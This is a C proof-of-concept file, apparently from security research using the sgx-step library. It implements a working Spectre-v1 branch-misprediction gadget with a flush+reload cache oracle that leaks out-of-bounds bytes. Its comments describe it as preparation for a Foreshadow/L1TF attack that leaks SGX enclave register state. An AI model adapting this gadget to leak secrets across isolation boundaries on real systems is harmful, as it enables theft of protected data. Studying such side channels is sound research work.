/*
 * GGSEC modifications and additions:
 * Copyright (C) 2026 Maciej Gojny, GG Advanced IT Security UG
 */
/*
 *  Offline prototype of the branch-misprediction leak gadget -- NO SGX, NO fault,
 *  NO SIGSEGV handler, NO root.
 *
 *  The live foreshadow-ssa-warm leak reads a non-present SSA alias, which FAULTS;
 *  the SIGSEGV skip-handler + sigreturn then run between the transient oracle
 *  touch and the reload and evict L1 -- the root cause of the 1-2 stochastic
 *  register misses (see STATUS.md, proven by selftest-decode.c being 256/256).
 *
 *  The fix direction is to drive the transient window with a MISPREDICTED branch
 *  instead of a faulting load, so the speculative access is squashed (no
 *  architectural fault, no kernel round-trip, no eviction). This file validates
 *  that machinery in isolation on this exact CPU: a textbook Spectre-v1 gadget
 *  (Kocher et al.) leaks a byte from beyond `array1_size` through the SAME split
 *  lo/hi oracle (SLOT_SIZE 0x1040, one class per L1 set) the live attack uses.
 *
 *  What it proves if it passes: on this i3-6100, branch misprediction opens a
 *  speculation window wide enough to touch the split oracle, and the oracle
 *  decodes the speculatively-leaked value. That is the risky new machinery for
 *  the live gadget; porting to L1TF then only swaps the speculative read target
 *  to the non-present SSA alias (terminal-fault forwarding under misprediction --
 *  the non-TSX Foreshadow variant). It does NOT itself exercise L1TF.
 *
 *  Build (on .86, no root):  gcc -O2 -I$HOME/sgx-step selftest-mispredict.c -o selftest-mispredict
 *  Run:                      ./selftest-mispredict         (TRIES=100 default)
 *                            TRIES=400 ./selftest-mispredict
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sched.h>

#include "libsgxstep/cache.h"    /* flush(), reload(), maccess() */

#define SLOT_SIZE     0x1040
#define LO_CLASSES    64
#define HI_CLASSES    4
#define HIT_THRESHOLD 120        /* offline: hit ~47, miss ~260 -> 120 is safe */
#define ARRAY1_LEN    1024
#define TRAIN_BOUND   256        /* architectural bound; malicious index is beyond it */

char __attribute__((aligned(0x1000))) oracle_lo[SLOT_SIZE * LO_CLASSES];
char __attribute__((aligned(0x1000))) oracle_hi[SLOT_SIZE * HI_CLASSES];

uint8_t array1[ARRAY1_LEN];
volatile size_t array1_size = TRAIN_BOUND;

/* the value to leak lives past the architectural bound (in bounds of the real
 * allocation, so the speculative read touches valid memory) */
#define SECRET_IDX 300
#define MASK(classes) ((classes) - 1)

static char  *oracle_g;
static int    classes_g;
static int    shift_g;

static void __attribute__((noinline)) victim(size_t x)
{
    if (x < array1_size)   /* flushed bound -> slow resolve -> mispredicts */
    {
        uint8_t v = array1[x];
        v = (uint8_t)((v >> shift_g) & MASK(classes_g));
        maccess(oracle_g + (size_t) v * SLOT_SIZE);
    }
}

static int results[LO_CLASSES];

/* leak one trace (lo: shift 0 / 64 classes, hi: shift 6 / 4 classes) */
static int spectre_class(char *base, int classes, int shift, int tries0)
{
    size_t malicious_x = SECRET_IDX;   /* > array1_size -> out of bounds */
    int c;

    oracle_g = base; classes_g = classes; shift_g = shift;
    for (c = 0; c < classes; c++) results[c] = 0;

    for (int tries = tries0; tries > 0; tries--)
    {
        for (c = 0; c < classes; c++)
            flush(base + (size_t) c * SLOT_SIZE);

        size_t training_x = tries % TRAIN_BOUND;
        int train_class = (array1[training_x] >> shift) & MASK(classes);

        for (int j = 29; j >= 0; j--)
        {
            flush((void *) &array1_size);
            for (volatile int z = 0; z < 100; z++) { }
            /* branchless select: malicious_x when j%6==0, else training_x */
            size_t x = ((j % 6) - 1) & ~0xFFFFUL;
            x = (x | (x >> 16));
            x = training_x ^ (x & (malicious_x ^ training_x));
            victim(x);
        }

        for (c = 0; c < classes; c++)
        {
            int mix = ((c * 167) + 13) % classes;    /* de-correlate probe order */
            uint64_t t = reload(base + (size_t) mix * SLOT_SIZE);
            if (t <= HIT_THRESHOLD && mix != train_class)
                results[mix]++;
        }
    }

    int best = 0;
    for (c = 1; c < classes; c++) if (results[c] > results[best]) best = c;
    return best;
}

int main(void)
{
    int tries = getenv("TRIES") ? atoi(getenv("TRIES")) : 100;
    if (tries < 1) tries = 1;

    cpu_set_t set; CPU_ZERO(&set); CPU_SET(1, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) { CPU_ZERO(&set); CPU_SET(0, &set); sched_setaffinity(0, sizeof(set), &set); }

    for (int i = 0; i < ARRAY1_LEN; i++) array1[i] = (uint8_t) i;  /* training values cycle */

    printf("mispredict gadget self-test: tries=%d, bound=%zu, malicious_idx=%d\n",
           tries, array1_size, SECRET_IDX);

    int ok = 0, fails = 0;
    for (int v = 0; v < 256; v++)
    {
        array1[SECRET_IDX] = (uint8_t) v;   /* the byte to speculatively leak */
        int lo = spectre_class(oracle_lo, LO_CLASSES, 0, tries);
        int hi = spectre_class(oracle_hi, HI_CLASSES, 6, tries);
        int rec = ((hi & 3) << 6) | (lo & 0x3f);
        if (rec == v) ok++;
        else {
            if (fails < 12)
                printf("  [FAIL] v=0x%02x (lo=%d hi=%d) -> 0x%02x (lo=%d hi=%d)\n",
                       v, v & 0x3f, v >> 6, rec, rec & 0x3f, rec >> 6);
            fails++;
        }
    }
    printf("RESULT: %d/256 leaked correctly via branch misprediction (%d fail)\n", ok, fails);
    return 0;
}
